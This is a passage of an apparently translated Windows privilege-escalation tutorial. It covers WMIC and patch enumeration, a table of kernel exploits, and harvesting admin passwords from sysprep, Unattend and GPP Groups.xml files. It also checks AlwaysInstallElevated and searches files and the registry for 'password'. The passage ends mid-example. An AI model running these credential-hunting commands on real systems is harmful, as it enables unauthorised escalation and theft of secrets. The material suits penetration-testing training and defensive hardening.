<h2 id="Δt-for-t4-The-Arcane-Arts-Of-WMIC"><a href="#Δt-for-t4-The-Arcane-Arts-Of-WMIC" class="headerlink" title="Δt for t4 - The Arcane Arts Of WMIC"></a>Δt for t4 - The Arcane Arts Of WMIC</h2><h4 id="我想要单独提及一下WMIC-Windows-Management-Instrumentation-Command-Line-，因为它是Windows最有用的命令行工具。WMIC-对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。"><a href="#我想要单独提及一下WMIC-Windows-Management-Instrumentation-Command-Line-，因为它是Windows最有用的命令行工具。WMIC-对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。" class="headerlink" title="我想要单独提及一下WMIC (Windows Management Instrumentation Command-Line) ，因为它是Windows最有用的命令行工具。WMIC 对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。"></a>我想要单独提及一下WMIC (Windows Management Instrumentation Command-Line) ，因为它是Windows最有用的命令行工具。WMIC 对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。</h4><h4 id="下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看："><a href="#下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看：" class="headerlink" title="下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看："></a>下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看：</h4><ul>
<li>Windows WMIC Command Line (ComputerHope) - <a href="https://www.computerhope.com/wmic.htm" target="_blank" rel="external">here</a></li>
</ul>
<h4 id="令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC-的测试中我注意到任何版本的XP-系统都不允许低权限账号使用WMIC。相反，默认安装的Windows-7-Professional-和Windows-8-企业版却允许使用低权限账号使用WMIC-来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？"><a href="#令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC-的测试中我注意到任何版本的XP-系统都不允许低权限账号使用WMIC。相反，默认安装的Windows-7-Professional-和Windows-8-企业版却允许使用低权限账号使用WMIC-来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？" class="headerlink" title="令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC 的测试中我注意到任何版本的XP 系统都不允许低权限账号使用WMIC。相反，默认安装的Windows 7 Professional 和Windows 8 企业版却允许使用低权限账号使用WMIC 来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？"></a>令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC 的测试中我注意到任何版本的XP 系统都不允许低权限账号使用WMIC。相反，默认安装的Windows 7 Professional 和Windows 8 企业版却允许使用低权限账号使用WMIC 来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？</h4><h4 id="为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC-收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows-补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。"><a href="#为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC-收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows-补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。" class="headerlink" title="为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC 收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows 补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。"></a>为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC 收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows 补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。</h4><h4 id="你可以从这里下载我的脚本"><a href="#你可以从这里下载我的脚本" class="headerlink" title="你可以从这里下载我的脚本"></a>你可以从这里<a href="http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar" target="_blank" rel="external">下载我的脚本</a></h4><h4 id="你也可以从这里下载我利用脚本收集的信息样本"><a href="#你也可以从这里下载我利用脚本收集的信息样本" class="headerlink" title="你也可以从这里下载我利用脚本收集的信息样本"></a>你也可以从这里下载我利用脚本收集的<a href="http://www.fuzzysecurity.com/tutorials/files/Win7.html" target="_blank" rel="external">信息样本</a></h4><h2 id="Δt-for-t5-to-t6-Quick-Fails"><a href="#Δt-for-t5-to-t6-Quick-Fails" class="headerlink" title="Δt for t5 to t6 - Quick Fails"></a>Δt for t5 to t6 - Quick Fails</h2><h4 id="继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了"><a href="#继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了" class="headerlink" title="继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了."></a>继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了.</h4><h4 id="尽管已经通过我的WMIC-脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。"><a href="#尽管已经通过我的WMIC-脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。" class="headerlink" title="尽管已经通过我的WMIC 脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。"></a>尽管已经通过我的WMIC 脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn</div><div class="line"></div><div class="line">Caption                                     Description      HotFixID   InstalledOn</div><div class="line">http://support.microsoft.com/?kbid=2727528  Security Update  KB2727528  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2729462  Security Update  KB2729462  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2736693  Security Update  KB2736693  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2737084  Security Update  KB2737084  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2742614  Security Update  KB2742614  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2742616  Security Update  KB2742616  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2750149  Update           KB2750149  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2756872  Update           KB2756872  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2756923  Security Update  KB2756923  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2757638  Security Update  KB2757638  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2758246  Update           KB2758246  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2761094  Update           KB2761094  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2764870  Update           KB2764870  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2768703  Update           KB2768703  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2769034  Update           KB2769034  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2769165  Update           KB2769165  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2769166  Update           KB2769166  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2770660  Security Update  KB2770660  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2770917  Update           KB2770917  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2771821  Update           KB2771821  11/24/2013</div><div class="line">[..Snip..]</div></pre></td></tr></table></figure>
<h4 id="提权的EXP-就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些-，大家可以下载对应版本的Windows-试试这些EXP。"><a href="#提权的EXP-就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些-，大家可以下载对应版本的Windows-试试这些EXP。" class="headerlink" title="提权的EXP 就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些:，大家可以下载对应版本的Windows 试试这些EXP。"></a>提权的EXP 就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="external">常见的EXP有这些:</a>，大家可以下载对应版本的Windows 试试这些EXP。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">#Security Bulletin   #KB     #Description    #Operating System  </div><div class="line">MS17-017 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)</div><div class="line">CVE-2017-8464 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</div><div class="line">CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</div><div class="line">CVE-2018-0833   [SMBv3 Null Pointer Dereference Denial of Service]    (Windows 8.1/Server 2012 R2)</div><div class="line">MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)</div><div class="line">MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)</div><div class="line">MS16-111 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1)</div><div class="line">MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)</div><div class="line">MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)</div><div class="line">MS16-034 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012)</div><div class="line">MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)</div><div class="line">MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)</div><div class="line">MS16-014 　[K3134228]　　[remote code execution]　　(2008/Vista/7)</div><div class="line">MS15-097 　[KB3089656]　　[remote code execution]　　(win8.1/2012)</div><div class="line">MS15-076 　[KB3067505]　　[RPC]　　(2003/2008/7/8/2012)</div><div class="line">MS15-077 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012)</div><div class="line">MS15-061 　[KB3057839]　　[Kernel Driver]　　(2003/2008/7/8/2012)</div><div class="line">MS15-051 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(2003/2008/7/8/2012)</div><div class="line">MS15-015 　[KB3031432]　　[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008 R2)</div><div class="line">MS15-010 　[KB3036220]　　[Kernel Driver]　　(2003/2008/7/8)</div><div class="line">MS15-001 　[KB3023266]　　[Kernel Driver]　　(2008/2012/7/8)</div><div class="line">MS14-070 　[KB2989935]　　[Kernel Driver]　　(2003)</div><div class="line">MS14-068 　[KB3011780]　　[Domain Privilege Escalation]　　(2003/2008/2012/7/8)</div><div class="line">MS14-058 　[KB3000061]　　[Win32k.sys]　　(2003/2008/2012/7/8)</div><div class="line">MS14-040 　[KB2975684]　　[AFD Driver]　　(2003/2008/2012/7/8)</div><div class="line">MS14-002 　[KB2914368]　　[NDProxy]　　(2003/XP)</div><div class="line">MS13-053 　[KB2850851]　　[win32k.sys]　　(XP/Vista/2003/2008/win 7)</div><div class="line">MS13-046 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/2003/2008/2012/7)</div><div class="line">MS13-005 　[KB2778930]　　[Kernel Mode Driver]　　(2003/2008/2012/win7/8)</div><div class="line">MS12-042 　[KB2972621]　　[Service Bus]　　(2008/2012/win7)</div><div class="line">MS12-020 　[KB2671387]　　[RDP]　　(2003/2008/7/XP)</div><div class="line">MS11-080 　[KB2592799]　　[AFD.sys]　　(2003/XP)</div><div class="line">MS11-062 　[KB2566454]　　[NDISTAPI]　　(2003/XP)</div><div class="line">MS11-046 　[KB2503665]　　[AFD.sys]　　(2003/2008/7/XP)</div><div class="line">MS11-011 　[KB2393802]　　[kernel Driver]　　(2003/2008/7/XP/Vista)</div><div class="line">MS10-092 　[KB2305420]　　[Task Scheduler]　　(2008/7)</div><div class="line">MS10-065 　[KB2267960]　　[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5)</div><div class="line">MS10-059 　[KB982799]　　 [ACL-Churraskito]　　(2008/7/Vista)</div><div class="line">MS10-048 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7)</div><div class="line">MS10-015 　[KB977165]　　 [KiTrap0D]　　(2003/2008/7/XP)</div><div class="line">MS10-012 　[KB971468]　　[SMB Client Trans2 stack overflow]　　(Windows 7/2008R2)</div><div class="line">MS09-050 　[KB975517]　　 [Remote Code Execution]　　(2008/Vista)</div><div class="line">MS09-020 　[KB970483]　　 [IIS 6.0]　　(IIS 5.1 and 6.0)</div><div class="line">MS09-012 　[KB959454]　　 [Chimichurri]　　(Vista/win7/2008/Vista)</div><div class="line">MS08-068 　[KB957097]　　 [Remote Code Execution]　　(2000/XP)</div><div class="line">MS08-067 　[KB958644]　　 [Remote Code Execution]　　(Windows 2000/XP/Server 2003/Vista/Server 2008)</div><div class="line">MS08-066 　[KB956803]　　 [AFD.sys]　　(Windows 2000/XP/Server 2003)</div><div class="line">MS08-025 　[KB941693]　　 [Win32.sys]　　(XP/2003/2008/Vista)</div><div class="line">MS06-040 　[KB921883]　　 [Remote Code Execution]　　(2003/xp/2000)</div><div class="line">MS05-039 　[KB899588]　　 [PnP Service]　　(Win 9X/ME/NT/2000/XP/2003)</div><div class="line">MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)</div></pre></td></tr></table></figure>
<h4 id="下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。"><a href="#下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。" class="headerlink" title="下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。"></a>下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。</h4><h4 id="通常这些敏感文件会出现在下面目录中："><a href="#通常这些敏感文件会出现在下面目录中：" class="headerlink" title="通常这些敏感文件会出现在下面目录中："></a>通常这些敏感文件会出现在下面目录中：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">c:\sysprep.inf</div><div class="line">c:\sysprep\sysprep.xml</div><div class="line">%WINDIR%\Panther\Unattend\Unattended.xml</div><div class="line">%WINDIR%\Panther\Unattended.xml</div></pre></td></tr></table></figure>
<h4 id="这些配置文件极可能包含明文密码，也可能会出现base64-编码的情况，下面是一些配置文件的事例："><a href="#这些配置文件极可能包含明文密码，也可能会出现base64-编码的情况，下面是一些配置文件的事例：" class="headerlink" title="这些配置文件极可能包含明文密码，也可能会出现base64 编码的情况，下面是一些配置文件的事例："></a>这些配置文件极可能包含明文密码，也可能会出现base64 编码的情况，下面是一些配置文件的事例：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"># This is a sample from sysprep.inf with clear-text credentials.</div><div class="line"></div><div class="line">[GuiUnattended]</div><div class="line">OEMSkipRegional=1</div><div class="line">OemSkipWelcome=1</div><div class="line">AdminPassword=s3cr3tp4ssw0rd</div><div class="line">TimeZone=20</div><div class="line"></div><div class="line"># This is a sample from sysprep.xml with Base64 &quot;encoded&quot; credentials. Please people Base64 is not</div><div class="line">encryption, I take more precautions to protect my coffee. The password here is &quot;SuperSecurePassword&quot;.</div><div class="line"></div><div class="line">&lt;LocalAccounts&gt;</div><div class="line">    &lt;LocalAccount wcm:action=&quot;add&quot;&gt;</div><div class="line">        &lt;Password&gt;</div><div class="line">            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</div><div class="line">            &lt;PlainText&gt;false&lt;/PlainText&gt;</div><div class="line">        &lt;/Password&gt;</div><div class="line">        &lt;Description&gt;Local Administrator&lt;/Description&gt;</div><div class="line">        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;</div><div class="line">        &lt;Group&gt;Administrators&lt;/Group&gt;</div><div class="line">        &lt;Name&gt;Administrator&lt;/Name&gt;</div><div class="line">    &lt;/LocalAccount&gt;</div><div class="line">&lt;/LocalAccounts&gt;</div><div class="line"></div><div class="line"># Sample from Unattended.xml with the same &quot;secure&quot; Base64 encoding.</div><div class="line"></div><div class="line">&lt;AutoLogon&gt;</div><div class="line">    &lt;Password&gt;</div><div class="line">        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</div><div class="line">        &lt;PlainText&gt;false&lt;/PlainText&gt;</div><div class="line">    &lt;/Password&gt;</div><div class="line">    &lt;Enabled&gt;true&lt;/Enabled&gt;</div><div class="line">    &lt;Username&gt;Administrator&lt;/Username&gt;</div><div class="line">&lt;/AutoLogon&gt;</div></pre></td></tr></table></figure>
<h4 id="GPO-首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL-中的Groups-xml-文件，任何经过身份认证的用户都可以读取该文件。尽管xml-文件中的密码通过使用AES-加密来保证安全性，但是通过msdn-发布的静态密钥可以很轻松的解密。"><a href="#GPO-首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL-中的Groups-xml-文件，任何经过身份认证的用户都可以读取该文件。尽管xml-文件中的密码通过使用AES-加密来保证安全性，但是通过msdn-发布的静态密钥可以很轻松的解密。" class="headerlink" title="GPO 首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL 中的Groups.xml 文件，任何经过身份认证的用户都可以读取该文件。尽管xml 文件中的密码通过使用AES 加密来保证安全性，但是通过msdn 发布的静态密钥可以很轻松的解密。"></a>GPO 首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL 中的Groups.xml 文件，任何经过身份认证的用户都可以读取该文件。尽管xml 文件中的密码通过使用AES 加密来保证安全性，但是通过msdn 发布的静态密钥可以很轻松的解密。</h4><p><img src="http://www.fuzzysecurity.com/tutorials/images/priv05_big.png" alt=""></p>
<h4 id="除了Groups-xml-以外，其他几个策略首选项文件也可能存在-“cPassword”-属性"><a href="#除了Groups-xml-以外，其他几个策略首选项文件也可能存在-“cPassword”-属性" class="headerlink" title="除了Groups.xml 以外，其他几个策略首选项文件也可能存在 “cPassword” 属性"></a>除了Groups.xml 以外，其他几个策略首选项文件也可能存在 “cPassword” 属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Services\Services.xml: Element-Specific Attributes</div><div class="line">ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element</div><div class="line">Printers\Printers.xml: SharedPrinter Element</div><div class="line">Drives\Drives.xml: Element-Specific Attributes</div><div class="line">DataSources\DataSources.xml: Element-Specific Attributes</div></pre></td></tr></table></figure>
<h4 id="如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。"><a href="#如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。" class="headerlink" title="如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。"></a>如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。</h4><p><img src="http://www.fuzzysecurity.com/tutorials/images/priv06_big.png" alt=""></p>
<h4 id="除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。"><a href="#除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。" class="headerlink" title="除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。"></a>除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">可以利用 msf 中的一个后渗透模块来实现自动化 [post/windows/gather/credentials/gpp](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)</div></pre></td></tr></table></figure>
<h4 id="接下来我们要查找一个奇怪的注册表设置-“AlwaysInstallElevated”-如果启动此设置，它会允许任何用户将-msi-文件安装为NT-AUTHORITY-SYSTEM-。"><a href="#接下来我们要查找一个奇怪的注册表设置-“AlwaysInstallElevated”-如果启动此设置，它会允许任何用户将-msi-文件安装为NT-AUTHORITY-SYSTEM-。" class="headerlink" title="接下来我们要查找一个奇怪的注册表设置 “AlwaysInstallElevated” , 如果启动此设置，它会允许任何用户将 *.msi 文件安装为NT AUTHORITY \ SYSTEM 。"></a>接下来我们要查找一个奇怪的注册表设置 “AlwaysInstallElevated” , 如果启动此设置，它会允许任何用户将 *.msi 文件安装为NT AUTHORITY \ SYSTEM 。</h4><h4 id="为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出-SYSTEM-shell-通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7-并没有这两个键值。"><a href="#为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出-SYSTEM-shell-通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7-并没有这两个键值。" class="headerlink" title="为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出 SYSTEM shell. 通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7 并没有这两个键值。"></a>为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出 SYSTEM shell. 通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7 并没有这两个键值。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># This will only work if both registry keys contain &quot;AlwaysInstallElevated&quot; with DWORD values of 1.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div><div class="line">C:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div></pre></td></tr></table></figure>
<h4 id="最后我们也可能通过下面的命令来挖到未知的宝藏"><a href="#最后我们也可能通过下面的命令来挖到未知的宝藏" class="headerlink" title="最后我们也可能通过下面的命令来挖到未知的宝藏"></a>最后我们也可能通过下面的命令来挖到未知的宝藏</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># The command below will search the file system for file names containing certain keywords. You can</div><div class="line">specify as many keywords as you wish.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; dir /s *pass* == *cred* == *vnc* == *.config*</div><div class="line"></div><div class="line"># Search certain file types for a keyword, this can generate a lot of output.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; findstr /si password *.xml *.ini *.txt</div><div class="line"></div><div class="line"># Similarly the two commands below can be used to grep the registry for keywords, in this case &quot;password&quot;.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; reg query HKLM /f password /t REG_SZ /s</div><div class="line">C:\Windows\system32&gt; reg query HKCU /f password /t REG_SZ /s</div></pre></td></tr></table></figure>
<h2 id="Δt-for-t7-to-t10-Roll-Up-Your-Sleeves"><a href="#Δt-for-t7-to-t10-Roll-Up-Your-Sleeves" class="headerlink" title="Δt for t7 to t10 - Roll Up Your Sleeves"></a>Δt for t7 to t10 - Roll Up Your Sleeves</h2><h4 id="希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows-服务和文件-文件夹-权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows-XP-系统"><a href="#希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows-服务和文件-文件夹-权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows-XP-系统" class="headerlink" title="希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows 服务和文件/文件夹 权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows XP 系统"></a>希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows 服务和文件/文件夹 权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows XP 系统</h4><h4 id="接下来我们将利用一个Windows中大神级的工具集Sysinternals-Suite-中的accesschk-exe-来批量检查权限信息，读者可以从这里下载这个工具集"><a href="#接下来我们将利用一个Windows中大神级的工具集Sysinternals-Suite-中的accesschk-exe-来批量检查权限信息，读者可以从这里下载这个工具集" class="headerlink" title="接下来我们将利用一个Windows中大神级的工具集Sysinternals Suite 中的accesschk.exe 来批量检查权限信息，读者可以从这里下载这个工具集"></a>接下来我们将利用一个Windows中大神级的工具集Sysinternals Suite 中的accesschk.exe 来批量检查权限信息，读者可以从这里<a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="external">下载这个工具集</a></h4><h4 id="接下来我们从Windows-的服务开始，通过重新配置service-的参数能够让我们快速达到目的。"><a href="#接下来我们从Windows-的服务开始，通过重新配置service-的参数能够让我们快速达到目的。" class="headerlink" title="接下来我们从Windows 的服务开始，通过重新配置service 的参数能够让我们快速达到目的。"></a>接下来我们从Windows 的服务开始，通过重新配置service 的参数能够让我们快速达到目的。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># We can use sc to query, configure and manage windows services.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; sc qc Spooler</div><div class="line"></div><div class="line">[SC] QueryServiceConfig SUCCESS</div><div class="line"></div><div class="line">SERVICE_NAME: Spooler</div><div class="line">        TYPE               : 110  WIN32_OWN_PROCESS (interactive)</div><div class="line">        START_TYPE         : 2   AUTO_START</div><div class="line">        ERROR_CONTROL      : 1   NORMAL</div><div class="line">        BINARY_PATH_NAME   : C:\Windows\System32\spoolsv.exe</div><div class="line">        LOAD_ORDER_GROUP   : SpoolerGroup</div><div 